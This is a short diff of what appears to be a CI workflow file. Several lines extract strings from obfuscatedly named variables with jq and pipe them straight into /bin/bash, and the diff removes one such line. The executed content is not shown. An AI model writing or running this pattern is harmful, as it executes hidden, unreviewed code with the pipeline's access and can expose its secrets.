@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$nxf020" | jq -r .zjcr608 | /bin/bash
           printf '%s' "$oilv82" | jq -r .jgxo21 | /bin/bash
           echo $ec3 | jq -r .wft2 | /bin/bash
-          echo $jo45125 | jq -r .c17 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
